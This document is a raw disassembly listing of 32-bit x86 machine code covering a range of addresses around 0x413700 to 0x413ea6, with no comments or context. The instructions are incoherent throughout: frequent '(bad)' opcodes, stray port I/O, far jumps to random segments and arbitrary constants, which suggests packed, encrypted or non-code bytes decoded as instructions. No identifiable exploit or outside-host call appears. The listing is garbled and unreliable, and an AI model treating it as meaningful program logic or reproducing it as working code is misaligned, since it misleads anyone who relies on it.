  4136f9:	test   DWORD PTR [esi-0x44],0x4f538bcf
  413700:	dec    eax
  413701:	hlt    
  413702:	retf   0x8958
  413705:	aaa    
  413706:	loopne 0x4136e9
  413708:	aaa    
  413709:	xchg   ebx,eax
  41370a:	adc    al,0x92
  41370c:	dec    ebp
  41370d:	outs   dx,BYTE PTR ds:[esi]
  41370e:	(bad)  
  41370f:	test   eax,0xa89b125b
  413714:	out    dx,al
  413715:	jb     0x413720
  413717:	dec    edi
  413718:	pop    esi
  413719:	cmc    
  41371a:	scas   eax,DWORD PTR es:[edi]
  41371b:	cmp    al,0xb4
  41371d:	test   DWORD PTR [ebp+0x27719ea7],eax
  413723:	add    eax,0xf1091d49
  413729:	icebp  
  41372a:	fwait
  41372b:	sbb    al,0x56
  41372d:	das    
  41372e:	outs   dx,DWORD PTR ds:[esi]
  41372f:	xchg   ecx,eax
  413730:	dec    esp
  413731:	repz (bad) 
  413733:	neg    BYTE PTR [edi+0x3c8f3ac1]
  413739:	outs   dx,DWORD PTR ds:[esi]
  41373a:	mov    esi,0xfd592a61
  41373f:	mov    ebp,eax
  413741:	dec    ecx
  413742:	(bad)  
  413744:	sub    eax,DWORD PTR [esi-0x2b]
  413747:	shr    ecx,1
  413749:	out    dx,al
  41374a:	xor    al,bh
  41374c:	add    al,BYTE PTR [edi]
  41374e:	pop    ss
  41374f:	and    BYTE PTR [ebx],0x72
  413752:	shl    DWORD PTR [esp+eiz*2-0x61],cl
  413756:	push   ds
  413757:	cmp    esp,edx
  413759:	sbb    esp,eax
  41375b:	pusha  
  41375c:	dec    ecx
  41375d:	pop    ss
  41375e:	ins    DWORD PTR es:[edi],dx
  41375f:	call   0x4ad24a62
  413764:	fisttp QWORD PTR [edx+0x4bd9d75b]
  41376a:	or     DWORD PTR [ebp+0x43bac87a],ebx
  413770:	int3   
  413771:	retf   
  413772:	inc    ecx
  413773:	jbe    0x4137b5
  413775:	sbb    edi,esp
  413777:	mov    WORD PTR [ecx],es
  413779:	mov    ch,0x81
  41377b:	lea    edi,[ebp+0x23]
  41377e:	sahf   
  41377f:	sbb    BYTE PTR [ecx],dh
  413781:	inc    esp
  413782:	jecxz  0x41375f
  413784:	(bad)  
  413785:	div    DWORD PTR [eax+eiz*2]
  413788:	jg     0x413809
  41378a:	mov    WORD PTR [edi+0x2758c775],es
  413790:	xor    cl,bl
  413792:	mov    eax,ds:0x96c28081
  413797:	jl     0x413783
  413799:	ja     0x41372a
  41379b:	out    dx,eax
  41379c:	fsubr  QWORD PTR [edi]
  41379e:	jl     0x413773
  4137a0:	and    al,0x38
  4137a2:	push   ebx
  4137a3:	test   DWORD PTR [ebx+0x17],edi
  4137a6:	fnstcw WORD PTR [esi+0x185cae56]
  4137ac:	add    ebx,DWORD PTR [ecx+0x6ffbfbac]
  4137b2:	scas   al,BYTE PTR es:[edi]
  4137b3:	arpl   WORD PTR [edi],di
  4137b5:	adc    ebx,DWORD PTR [eax+ebx*4]
  4137b8:	jmp    0xaf56:0x94401c59
  4137bf:	stos   DWORD PTR es:[edi],eax
  4137c0:	push   ss
  4137c1:	jb     0x41379b
  4137c3:	or     BYTE PTR cs:[edi-0x47],dh
  4137c7:	sub    BYTE PTR [ebx],ch
  4137c9:	xor    al,0xd8
  4137cb:	call   0x33e0a391
  4137d0:	jge    0x41382f
  4137d2:	cwde   
  4137d3:	(bad)  
  4137d4:	fisubr DWORD PTR [edi+eax*4-0x32d675f9]
  4137db:	jle    0x413799
  4137dd:	and    al,0xbc
  4137df:	adc    al,0x68
  4137e1:	xor    eax,0x8382d921
  4137e6:	faddp  st(6),st
  4137e8:	int    0x4a
  4137ea:	push   es
  4137eb:	xor    edi,DWORD PTR [edx+0x4f]
  4137ee:	rcr    BYTE PTR [edx+0x5c93835c],cl
  4137f4:	je     0x4137ba
  4137f6:	xor    ecx,esi
  4137f8:	movd   mm4,DWORD PTR [ebx]
  4137fb:	mov    ds:0x4a36a82a,eax
  413800:	rcr    DWORD PTR [esi+0x48],0x42
  413804:	push   0xffffffe6
  413806:	or     DWORD PTR [eax+0x3e26dab3],edi
  41380c:	cmp    al,0x26
  41380e:	mov    dh,0xc1
  413810:	jle    0x413831
  413812:	lea    eax,[esi+0x5933af33]
  413818:	daa    
  413819:	ret    0x9252
  41381c:	xchg   esp,eax
  41381d:	jns    0x4137e4
  41381f:	dec    ebx
  413820:	push   ebp
  413821:	cmp    bl,BYTE PTR [edx+ebx*4-0x3d]
  413825:	cmp    al,BYTE PTR [esi-0x78]
  413828:	(bad)  
  413829:	dec    eax
  41382a:	push   eax
  41382b:	xchg   BYTE PTR [esi-0x4ec29891],cl
  413831:	add    al,0x91
  413833:	lods   al,BYTE PTR ds:[esi]
  413834:	mov    edx,0x685aa60b
  413839:	popf   
  41383a:	sahf   
  41383b:	pushf  
  41383c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41383d:	adc    BYTE PTR [edi+eiz*1],bl
  413840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413841:	add    BYTE PTR [ebp+0x5cc20812],al
  413847:	pop    eax
  413848:	xchg   esi,eax
  413849:	xor    al,0xce
  41384b:	arpl   WORD PTR [edx+0xe17b6e1],bp
  413851:	imul   ebx,DWORD PTR [ebx],0x1ff7bd44
  413857:	lods   al,BYTE PTR ds:[esi]
  413858:	add    al,0x30
  41385a:	dec    edx
  41385b:	push   ecx
  41385c:	not    DWORD PTR [esi]
  41385e:	rcl    DWORD PTR [esi+0x15006bf5],1
  413864:	sub    esp,DWORD PTR ds:0x3ff19f0
  41386a:	xchg   edx,eax
  41386b:	sub    bh,bh
  41386d:	aad    0xfa
  41386f:	jl     0x413870
  413871:	retf   0xd626
  413874:	sar    BYTE PTR [edx+ebx*8],cl
  413877:	popf   
  413878:	dec    eax
  413879:	jne    0x41389b
  41387b:	xor    DWORD PTR [ebx+0x3b112020],ebp
  413881:	jmp    0x75fc7d16
  413886:	pop    eax
  413887:	dec    edi
  413888:	stc    
  413889:	aas    
  41388a:	mov    cl,0xe0
  41388c:	stos   BYTE PTR es:[edi],al
  41388d:	sbb    BYTE PTR [ebp+0x30e7eef6],0x14
  413894:	test   BYTE PTR [edi+0x70419dcd],bl
  41389a:	and    al,BYTE PTR ds:0xe0b935b3
  4138a0:	fwait
  4138a1:	push   ecx
  4138a2:	gs sub ebx,eax
  4138a5:	jmp    0xa82e:0x43cf814f
  4138ac:	push   eax
  4138ad:	add    al,BYTE PTR [edi]
  4138af:	aaa    
  4138b0:	pop    ebp
  4138b1:	fld    TBYTE PTR [ebx-0x4f]
  4138b4:	or     ebp,edi
  4138b6:	sbb    bh,al
  4138b8:	aad    0x71
  4138ba:	or     DWORD PTR [ebx*1-0x6dfa6067],esi
  4138c1:	sbb    esi,DWORD PTR [ebp+esi*4+0x4d74c91c]
  4138c8:	pop    edx
  4138c9:	jns    0x4138da
  4138cb:	jg     0x41386e
  4138cd:	dec    esi
  4138ce:	(bad)  
  4138cf:	xor    DWORD PTR [esi+0x67],esp
  4138d2:	js     0x4138ba
  4138d4:	int3   
  4138d5:	ret    
  4138d6:	or     ecx,DWORD PTR [ecx+0x5e49c152]
  4138dc:	ins    DWORD PTR es:[edi],dx
  4138dd:	cmp    BYTE PTR [ecx-0x5d667c72],al
  4138e3:	addr16 (bad) 
  4138e5:	cmc    
  4138e6:	and    eax,0x93d4cf7d
  4138eb:	jmp    0x4138c7
  4138ed:	cwde   
  4138ee:	fist   DWORD PTR [edx]
  4138f0:	test   DWORD PTR [eax],edi
  4138f2:	shr    BYTE PTR [esi+0x6d],cl
  4138f5:	pop    edx
  4138f6:	sub    BYTE PTR [ebx-0x772fe923],al
  4138fc:	inc    esp
  4138fd:	push   edi
  4138fe:	sub    ah,BYTE PTR [edi+0x255684a4]
  413904:	std    
  413905:	jmp    FWORD PTR [ebp-0x6e]
  413908:	test   eax,0xbb697547
  41390d:	pop    eax
  41390e:	push   ebp
  41390f:	fsubr  QWORD PTR [esi]
  413911:	mov    ch,0x6
  413913:	sub    BYTE PTR [ebx-0x79],0xaf
  413917:	in     al,0xc1
  413919:	xor    BYTE PTR [ecx],ah
  41391b:	(bad)  
  41391c:	std    
  41391d:	xor    BYTE PTR [ebx+0x4e],0x1e
  413921:	sbb    DWORD PTR [eax+0x16],0xffffffb1
  413925:	call   0x2f68:0x45b405a8
  41392c:	shr    BYTE PTR [edi-0x4d],cl
  41392f:	neg    DWORD PTR [ebx-0x3c27f0f9]
  413935:	fidivr DWORD PTR [ecx-0x5e139b2a]
  41393b:	arpl   WORD PTR [edx-0x57],bx
  41393e:	(bad)  
  41393f:	mov    al,0x52
  413941:	nop
  413942:	(bad)  
  413943:	pop    edx
  413944:	retf   0x1f6a
  413947:	jp     0x4138d4
  413949:	push   0x13
  41394b:	nop
  41394c:	cmc    
  41394d:	push   0x86dddbc2
  413952:	mov    edi,DWORD PTR [ebx]
  413954:	adc    ebx,DWORD PTR [ebp+0x6f2d8243]
  41395a:	or     cl,dh
  41395c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41395d:	data16 or BYTE PTR [eax-0x12],dh
  413961:	rcr    DWORD PTR ds:0x9d29f004,1
  413967:	cdq    
  413968:	mov    ebp,0xd07590e
  41396d:	cmp    dh,BYTE PTR [ecx-0x30]
  413970:	shl    BYTE PTR [ecx+0x2b],1
  413973:	push   esp
  413974:	cmc    
  413975:	sub    al,0xf6
  413977:	jg     0x4139bf
  413979:	dec    esi
  41397a:	and    BYTE PTR [esi-0x3bdf0884],0xb6
  413981:	jnp    0x4139c9
  413983:	adc    eax,0x2c4e52c6
  413988:	loope  0x413967
  41398a:	adc    DWORD PTR [edi-0x5bbdb3ca],esi
  413990:	(bad)  
  413991:	adc    esp,esp
  413993:	call   0xbed8f275
  413998:	into   
  413999:	nop
  41399a:	loopne 0x413933
  41399c:	das    
  41399d:	into   
  41399e:	push   ss
  41399f:	push   es
  4139a0:	add    BYTE PTR [edi],al
  4139a2:	icebp  
  4139a3:	or     al,0x87
  4139a5:	xor    BYTE PTR [edi-0x11d5db3d],0x9a
  4139ac:	jae    0x4139f3
  4139ae:	shl    BYTE PTR [esi],1
  4139b0:	jae    0x41393b
  4139b2:	xchg   edi,eax
  4139b3:	call   0x35792e31
  4139b8:	sar    BYTE PTR [eax+0x932450],1
  4139be:	shr    bh,0x5b
  4139c1:	ret    
  4139c2:	adc    esp,DWORD PTR [eax+0x355f0b0f]
  4139c8:	sti    
  4139c9:	stos   DWORD PTR es:[edi],eax
  4139ca:	ja     0x4139f8
  4139cc:	sahf   
  4139cd:	mov    ecx,0xddccadba
  4139d2:	xchg   DWORD PTR [edi+0x4c26dce5],esp
  4139d8:	sub    eax,0xf911ad00
  4139dd:	pop    eax
  4139de:	or     bh,BYTE PTR [ecx+edi*1-0x4b]
  4139e2:	cmp    BYTE PTR [eax+0x464f23c9],bh
  4139e8:	lds    ebp,FWORD PTR [edx]
  4139ea:	dec    eax
  4139eb:	cwde   
  4139ec:	stos   BYTE PTR es:[edi],al
  4139ed:	jp     0x413983
  4139ef:	out    dx,eax
  4139f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f1:	rcl    ebp,0xd3
  4139f4:	fisub  WORD PTR [edi+0x4b]
  4139f7:	xor    DWORD PTR [ebx],0x4a
  4139fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139fb:	inc    ecx
  4139fc:	aaa    
  4139fd:	dec    eax
  4139fe:	push   ebx
  4139ff:	xlat   BYTE PTR ds:[ebx]
  413a00:	test   BYTE PTR [eax],dl
  413a02:	cwde   
  413a03:	mov    ds:0x800ea836,al
  413a08:	lock cs sbb eax,0xcc37e9aa
  413a0f:	adc    eax,0xd80002c
  413a14:	sub    al,0xab
  413a16:	scas   eax,DWORD PTR es:[edi]
  413a17:	test   BYTE PTR [esi-0x6d],ah
  413a1a:	pop    edi
  413a1b:	ins    DWORD PTR es:[edi],dx
  413a1c:	dec    esi
  413a1d:	push   ebx
  413a1e:	scas   eax,DWORD PTR es:[edi]
  413a1f:	cmp    eax,0x4c6d9832
  413a24:	bound  eax,QWORD PTR [esi]
  413a26:	cld    
  413a27:	jl     0x413a79
  413a29:	cmp    al,0x4d
  413a2b:	pop    es
  413a2c:	sbb    edi,edx
  413a2e:	push   edx
  413a2f:	pop    esp
  413a30:	cmp    BYTE PTR [ebx],ah
  413a32:	cmp    BYTE PTR [ebx+0x56],ah
  413a35:	cmp    edx,DWORD PTR [ebx-0x4c]
  413a38:	xchg   edx,eax
  413a39:	push   0x7e
  413a3b:	cdq    
  413a3c:	(bad)  
  413a3d:	pop    ebp
  413a3e:	fldcw  WORD PTR [edi-0x6997c644]
  413a44:	in     eax,0xd8
  413a46:	push   esp
  413a47:	jl     0x413a78
  413a49:	jle    0x413a19
  413a4b:	sbb    BYTE PTR [ecx-0xf],bl
  413a4e:	addr16 sbb eax,0xb9f9e960
  413a54:	push   ebx
  413a55:	iret   
  413a56:	pop    esp
  413a57:	arpl   WORD PTR [ebx+0x36],cx
  413a5a:	add    eax,0xc802b0f3
  413a5f:	ds fwait
  413a61:	push   cs
  413a62:	aaa    
  413a63:	push   ss
  413a64:	or     BYTE PTR [edx-0x3c1c6a4f],bh
  413a6a:	and    eax,0xce581b7e
  413a6f:	cmp    eax,DWORD PTR [ecx+0x2a33303a]
  413a75:	es aad 0xf1
  413a78:	add    eax,DWORD PTR [edx-0x5f]
  413a7b:	xchg   ebp,eax
  413a7c:	dec    ebp
  413a7d:	sbb    dh,al
  413a7f:	nop
  413a80:	xchg   esp,esp
  413a82:	int    0x31
  413a84:	or     BYTE PTR [ecx-0x7d0b470b],ah
  413a8a:	sbb    ch,0x81
  413a8d:	xchg   esi,eax
  413a8e:	and    ch,BYTE PTR [ebx]
  413a90:	test   al,0x1e
  413a92:	shr    DWORD PTR [edi],cl
  413a94:	mov    eax,ds:0x5211cd34
  413a99:	sbb    al,0xd7
  413a9b:	sbb    esp,DWORD PTR [eax]
  413a9d:	xlat   BYTE PTR ds:[ebx]
  413a9e:	xor    edi,DWORD PTR [ecx+0xb]
  413aa1:	addr16 clc 
  413aa3:	mov    al,0x43
  413aa5:	inc    ecx
  413aa6:	cwde   
  413aa7:	repz and ebp,0xf3f00223
  413aae:	stos   DWORD PTR es:[edi],eax
  413aaf:	shl    DWORD PTR [edx+ebx*1],cl
  413ab2:	(bad)  
  413ab3:	(bad)  
  413ab4:	mov    ss,esi
  413ab6:	mov    ds,edi
  413ab8:	sahf   
  413ab9:	xchg   BYTE PTR [edx-0x54],ch
  413abc:	sub    ah,cl
  413abe:	add    al,0xf7
  413ac0:	and    bh,BYTE PTR [edi+eax*4]
  413ac3:	add    bl,BYTE PTR [edx]
  413ac5:	jmp    0x4ee2:0x7a8d1d59
  413acc:	aad    0xaf
  413ace:	xor    ebx,ebp
  413ad0:	enter  0x5b5a,0xc9
  413ad4:	outs   dx,DWORD PTR ds:[esi]
  413ad5:	jmp    0xa377eaef
  413ada:	call   0x90f9:0x578b0959
  413ae1:	(bad)  
  413ae2:	loopne 0x413abe
  413ae4:	cmp    eax,0x1fea3335
  413ae9:	je     0x413a90
  413aeb:	cmp    eax,0xabbb1cb5
  413af0:	xor    DWORD PTR [ebx+0x7578c59e],ecx
  413af6:	fcmove st,st(2)
  413af8:	imul   edi,DWORD PTR [esi-0x3c],0x8
  413afc:	iret   
  413afd:	test   bh,al
  413aff:	mov    esp,DWORD PTR [ebx+edx*4-0x58]
  413b03:	sbb    eax,0xefa7888f
  413b08:	add    DWORD PTR [ebx-0x565290e8],edx
  413b0e:	dec    edi
  413b0f:	sti    
  413b10:	push   edi
  413b11:	sbb    edi,DWORD PTR [edi]
  413b13:	mov    esp,0x9581a296
  413b18:	in     eax,0x30
  413b1a:	bound  ebp,QWORD PTR ds:0x4e8ba2cb
  413b20:	fstsw  WORD PTR [ebx-0x5005a279]
  413b27:	adc    DWORD PTR [edi+ecx*8+0x55],ebx
  413b2b:	mov    ds:0xb38e5852,eax
  413b30:	int3   
  413b31:	lods   al,BYTE PTR ds:[esi]
  413b32:	sbb    BYTE PTR [ecx+0x8fe3556],0x5e
  413b39:	out    0xd2,eax
  413b3b:	xchg   BYTE PTR [esi-0x6e],bh
  413b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b3f:	jnp    0x413b94
  413b41:	(bad)  
  413b43:	sub    BYTE PTR [ecx+0x1382046e],ch
  413b49:	call   0x944c1415
  413b4e:	mov    cl,0xa0
  413b50:	js     0x413b9a
  413b52:	arpl   bp,di
  413b54:	xchg   DWORD PTR [edx],ecx
  413b56:	cmp    eax,0xb77b7350
  413b5b:	sbb    ecx,DWORD PTR [edx]
  413b5d:	dec    eax
  413b5e:	loope  0x413b90
  413b60:	or     BYTE PTR [edi+0x7f],al
  413b63:	mov    BYTE PTR [esi-0x24d1a91b],bl
  413b69:	push   ds
  413b6a:	push   ebx
  413b6b:	jecxz  0x413b75
  413b6d:	dec    edx
  413b6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b6f:	pop    es
  413b70:	outs   dx,DWORD PTR ds:[esi]
  413b71:	cmp    edx,esp
  413b73:	mov    dl,0xa
  413b75:	and    dh,BYTE PTR [eax-0x4260af6a]
  413b7b:	xor    al,0xbc
  413b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b7e:	popf   
  413b7f:	arpl   dx,bx
  413b81:	mov    esi,cs
  413b83:	jp     0x413bbb
  413b85:	pushf  
  413b86:	in     al,dx
  413b87:	xor    eax,0x32d46adc
  413b8c:	(bad)  
  413b8d:	xchg   esp,eax
  413b8e:	fs inc ebp
  413b90:	cmp    ah,BYTE PTR [ebx]
  413b92:	adc    eax,0xed298e85
  413b97:	cmp    ebp,DWORD PTR [ebp-0x72b0e4e5]
  413b9d:	test   al,0x9
  413ba0:	jecxz  0x413b8f
  413ba2:	mov    al,ds:0x202e8b4c
  413ba7:	pop    edi
  413ba8:	iret   
  413ba9:	leave  
  413baa:	cs ins BYTE PTR es:[edi],dx
  413bac:	mov    bh,0xf0
  413bae:	mov    edi,0x1a8c2a0a
  413bb3:	mov    ecx,0x6d904603
  413bb8:	lea    edx,[eax-0x50]
  413bbb:	pop    edi
  413bbc:	xchg   ebp,eax
  413bbd:	imul   ecx,DWORD PTR [edx+0x299d57cd],0x793f5305
  413bc7:	ficom  WORD PTR [eax-0x7db6285c]
  413bcd:	rcr    BYTE PTR ds:0xbc199bdb,cl
  413bd3:	pop    ds
  413bd4:	xlat   BYTE PTR ds:[ebx]
  413bd5:	add    dh,ah
  413bd7:	add    ch,BYTE PTR [ecx]
  413bd9:	xchg   ebx,eax
  413bda:	jmp    0xfaf9a76
  413bdf:	mov    dl,0xf6
  413be1:	push   ecx
  413be2:	jge    0x413b7b
  413be4:	jle    0x413bff
  413be6:	fdivr  DWORD PTR [ebp+0x12c5bc89]
  413bec:	add    BYTE PTR [ecx-0x3c],ah
  413bef:	and    BYTE PTR [edi],0xd9
  413bf2:	clc    
  413bf3:	ja     0x413bb2
  413bf5:	in     eax,0x70
  413bf7:	jmp    0x7b9f:0x84ddf45d
  413bfe:	sub    eax,0xe9bfc1d2
  413c03:	jbe    0x413c25
  413c05:	pop    edx
  413c06:	cmp    eax,0x535cef6d
  413c0b:	cwde   
  413c0c:	adc    eax,0xff7ecfb7
  413c11:	in     eax,0x4b
  413c13:	push   ds
  413c14:	mov    cl,0xb5
  413c16:	adc    eax,0x7a03c49
  413c1b:	aad    0x64
  413c1d:	mov    ch,0x9a
  413c1f:	xchg   ebx,eax
  413c20:	arpl   bp,bp
  413c22:	ficom  WORD PTR [eax+0x6b79aa60]
  413c28:	add    eax,0x898f92c5
  413c2d:	inc    edi
  413c2e:	je     0x413c0e
  413c30:	mov    ds:0x58878743,eax
  413c35:	loop   0x413bde
  413c37:	and    edx,DWORD PTR [edx+ebx*8]
  413c3a:	mov    dl,0x2c
  413c3c:	lods   al,BYTE PTR ds:[esi]
  413c3d:	mov    edi,0xd2d3ed31
  413c43:	mov    edx,0xd978217f
  413c48:	neg    DWORD PTR [edi]
  413c4a:	or     eax,0x3d1ef76a
  413c4f:	mov    ds:0x22ab581a,al
  413c54:	pushf  
  413c55:	xor    ecx,DWORD PTR [ebp-0x68]
  413c58:	daa    
  413c59:	sbb    bh,BYTE PTR [edi]
  413c5b:	gs in  al,dx
  413c5d:	ins    BYTE PTR es:[edi],dx
  413c5e:	mov    ?,WORD PTR [ecx+0x6b82d1f8]
  413c64:	mov    dh,0xbf
  413c66:	xchg   BYTE PTR [ebp-0x55b6f415],dl
  413c6c:	mov    edx,0x9faa7ccd
  413c71:	and    BYTE PTR [esi],bh
  413c73:	lock fstp DWORD PTR [edx+edx*8]
  413c77:	in     eax,dx
  413c78:	dec    eax
  413c79:	call   0xbf9cb833
  413c7e:	into   
  413c7f:	push   ecx
  413c80:	mov    bl,0x2f
  413c82:	cmc    
  413c83:	cwde   
  413c84:	call   0xbe8c:0x906537c9
  413c8b:	fldenv [ebx+eiz*1]
  413c8e:	dec    eax
  413c8f:	cli    
  413c90:	fsubr  st,st(2)
  413c92:	dec    esp
  413c93:	sbb    BYTE PTR [edi-0x5165982f],bh
  413c99:	lods   al,BYTE PTR ds:[esi]
  413c9a:	js     0x413cf6
  413c9c:	cmp    eax,0x7fb70756
  413ca1:	fsqrt  
  413ca3:	or     DWORD PTR [ebx-0x46c4c11],ebx
  413ca9:	out    dx,al
  413caa:	(bad)  
  413cab:	pop    esp
  413cac:	adc    ch,BYTE PTR [eax-0x5c]
  413caf:	pop    edi
  413cb0:	loopne 0x413c7c
  413cb2:	xor    bh,BYTE PTR [ecx]
  413cb4:	mov    al,ds:0x4f2f4c3a
  413cb9:	cli    
  413cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cbb:	pop    esp
  413cbc:	loopne 0x413ce8
  413cbe:	ss add eax,0x99608d64
  413cc4:	and    BYTE PTR [esi],ch
  413cc6:	ds mov ecx,0x6fcfe84b
  413ccc:	(bad)  
  413ccd:	retf   0xba5b
  413cd0:	cmp    eax,0xf76f407d
  413cd5:	mov    bh,0xa5
  413cd7:	repz stc 
  413cd9:	popf   
  413cda:	xchg   esi,eax
  413cdb:	mov    bh,0xb0
  413cdd:	add    ebp,esi
  413cdf:	fld    DWORD PTR [esi-0x45]
  413ce2:	mov    ecx,0x37c921b
  413ce7:	(bad)  
  413ce8:	retf   
  413ce9:	jl     0x413cd5
  413ceb:	mov    cl,0x91
  413ced:	pushf  
  413cee:	ins    BYTE PTR es:[edi],dx
  413cef:	mov    ah,0x46
  413cf1:	add    BYTE PTR [ebp-0x6e],ah
  413cf4:	and    BYTE PTR [esi+0x2d4cb3ca],ch
  413cfa:	(bad)  
  413cfb:	push   edx
  413cfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cfd:	xchg   ebx,ecx
  413cff:	mov    bh,0x3d
  413d01:	pop    edi
  413d02:	lods   al,BYTE PTR ds:[esi]
  413d03:	sar    DWORD PTR [ecx],0x5b
  413d06:	add    dl,BYTE PTR [eax]
  413d08:	in     al,dx
  413d09:	(bad)  
  413d0a:	pop    eax
  413d0b:	or     eax,0xb587dabd
  413d10:	in     eax,dx
  413d11:	bound  edi,QWORD PTR [eax-0x54]
  413d14:	(bad)  
  413d15:	or     esp,DWORD PTR [eax+0x3d82d8aa]
  413d1b:	(bad)  
  413d1c:	mov    edi,0x10dffae6
  413d21:	(bad)  
  413d22:	pop    ecx
  413d23:	scas   eax,DWORD PTR es:[edi]
  413d24:	adc    dh,BYTE PTR [eax+eax*4+0x4e]
  413d28:	(bad)  
  413d29:	rcl    BYTE PTR [edi],cl
  413d2b:	inc    ebp
  413d2c:	loop   0x413d39
  413d2e:	arpl   WORD PTR [ebx-0x1a],bp
  413d31:	shr    al,cl
  413d33:	ret    0x8d15
  413d36:	mov    dl,0x66
  413d38:	cs cs call 0xe94a:0x10ac2e97
  413d41:	ins    BYTE PTR es:[edi],dx
  413d42:	jae    0x413d7b
  413d44:	adc    DWORD PTR [edx-0x9],eax
  413d47:	test   DWORD PTR [ebx-0x65],eax
  413d4a:	enter  0x8e15,0xb7
  413d4e:	in     eax,0x2c
  413d50:	daa    
  413d51:	lock ror DWORD PTR [edi+0x204634ee],0xd1
  413d59:	jg     0x413daa
  413d5b:	lods   al,BYTE PTR ds:[esi]
  413d5c:	ffree  st(7)
  413d5e:	sbb    ecx,edi
  413d60:	sbb    al,0x18
  413d62:	mov    ds:0x1f364631,al
  413d67:	icebp  
  413d68:	ins    DWORD PTR es:[edi],dx
  413d69:	xchg   BYTE PTR [ebx+0xa],ch
  413d6c:	and    dl,BYTE PTR [ebp+0x29c99461]
  413d72:	les    ecx,FWORD PTR [ebp+eiz*8+0xe01783d]
  413d79:	(bad)  
  413d7a:	xchg   esi,eax
  413d7b:	js     0x413de2
  413d7d:	mov    esi,0xcd8a1649
  413d82:	xchg   edi,eax
  413d83:	push   esp
  413d84:	idiv   DWORD PTR [eax]
  413d86:	icebp  
  413d87:	and    eax,0x6f768e29
  413d8c:	mov    al,0x29
  413d8e:	xor    al,0x1d
  413d90:	enter  0x1a7,0x5
  413d94:	loop   0x413d18
  413d96:	sbb    ecx,edx
  413d98:	dec    edi
  413d99:	dec    esi
  413d9a:	cmp    cl,bh
  413d9c:	clc    
  413d9d:	loope  0x413dc4
  413d9f:	(bad)  
  413da1:	stos   DWORD PTR es:[edi],eax
  413da2:	sar    dh,0xa5
  413da5:	inc    ebp
  413da6:	ror    dl,0x2a
  413da9:	rcr    DWORD PTR [ebx],cl
  413dab:	pop    edi
  413dac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dad:	imul   eax,DWORD PTR [edx+0x5e],0x5def01b0
  413db4:	pusha  
  413db5:	data16 sahf 
  413db7:	rcr    DWORD PTR [esi+0x8198265],1
  413dbd:	inc    eax
  413dbe:	mov    al,0x1a
  413dc0:	inc    esi
  413dc1:	cmp    cl,ah
  413dc3:	inc    eax
  413dc4:	mov    edi,0xddb8dc0c
  413dc9:	inc    eax
  413dca:	inc    edx
  413dcb:	mov    cl,0x22
  413dcd:	mov    dh,0x26
  413dcf:	and    dl,BYTE PTR [edi]
  413dd1:	jle    0x413db3
  413dd3:	scas   al,BYTE PTR es:[edi]
  413dd4:	cmp    eax,0x2d8cf644
  413dd9:	sub    cl,BYTE PTR [edx+edx*1]
  413ddc:	nop
  413ddd:	neg    BYTE PTR [ebp+0x25]
  413de0:	push   ds
  413de1:	push   0xffffff8f
  413de3:	inc    ebx
  413de4:	mov    ds:0x43e05192,eax
  413de9:	int    0x44
  413deb:	scas   al,BYTE PTR es:[edi]
  413dec:	(bad)  
  413dee:	xchg   edi,eax
  413def:	cs ds loopne 0x413dce
  413df3:	mov    ecx,0x7eb4194f
  413df8:	outs   dx,BYTE PTR ds:[esi]
  413df9:	imul   edi,DWORD PTR [ebp+eax*2-0x6c],0xffffff9e
  413dfe:	pop    es
  413dff:	mov    BYTE PTR [ebp+0x1f8e0e1e],dl
  413e05:	jmp    0x95cb:0xd2b9fb17
  413e0c:	xor    BYTE PTR [esi-0x4b465572],ah
  413e12:	(bad)  
  413e13:	mov    ch,0x67
  413e15:	xchg   edi,eax
  413e16:	sub    al,0xbd
  413e18:	xor    edi,ecx
  413e1a:	add    al,BYTE PTR [edi]
  413e1c:	out    dx,eax
  413e1d:	dec    esp
  413e1e:	xchg   ch,ch
  413e20:	mov    ch,0x2a
  413e22:	pop    ecx
  413e23:	sbb    eax,0xc6493ca6
  413e28:	popa   
  413e29:	cmp    BYTE PTR [eax+0x78],dl
  413e2c:	test   DWORD PTR [ecx-0x21],ebp
  413e2f:	sti    
  413e30:	(bad)  
  413e31:	daa    
  413e32:	pusha  
  413e33:	cdq    
  413e34:	leave  
  413e35:	ja     0x413dfc
  413e37:	mov    ebx,0x2a79bd17
  413e3c:	inc    ebx
  413e3d:	xchg   esp,eax
  413e3e:	(bad)  
  413e3f:	leave  
  413e40:	mov    DWORD PTR [eax],edx
  413e42:	adc    al,0x8c
  413e44:	sti    
  413e45:	sub    al,0x56
  413e47:	(bad)  
  413e48:	lock add DWORD PTR [edx+0x26],edx
  413e4c:	data16 and BYTE PTR [ebx+0x4],bh
  413e50:	repnz test eax,0xa7683b6e
  413e56:	(bad)  
  413e57:	cmp    al,0xf4
  413e59:	fcom   QWORD PTR [ebx]
  413e5b:	push   ebp
  413e5c:	xor    eax,0xde09dcc
  413e61:	adc    eax,0x6ee33687
  413e66:	jns    0x413e27
  413e68:	pop    ss
  413e69:	pop    ds
  413e6a:	fwait
  413e6b:	jg     0x413e98
  413e6d:	bound  eax,QWORD PTR [ebx+0x2bc01f2d]
  413e73:	in     eax,0x21
  413e75:	mov    esp,0x203ca0da
  413e7a:	pop    eax
  413e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e7c:	dec    esp
  413e7d:	outs   dx,BYTE PTR ds:[esi]
  413e7e:	je     0x413e21
  413e80:	out    dx,al
  413e81:	xchg   edx,eax
  413e82:	add    BYTE PTR [ebx],0xfe
  413e85:	test   eax,0xf704b0a1
  413e8a:	or     bh,BYTE PTR [eax]
  413e8c:	in     al,dx
  413e8d:	outs   dx,BYTE PTR ds:[esi]
  413e8e:	push   ds
  413e8f:	daa    
  413e90:	jg     0x413e25
  413e92:	jmp    0x400a5eab
  413e97:	jns    0x413e61
  413e99:	sub    cl,BYTE PTR [esi+ebx*2-0x6d]
  413e9d:	or     DWORD PTR [eax-0x4c],ecx
  413ea0:	mov    ds:0xdf546bd0,al
  413ea5:	push   eax
  413ea6:	pusha  
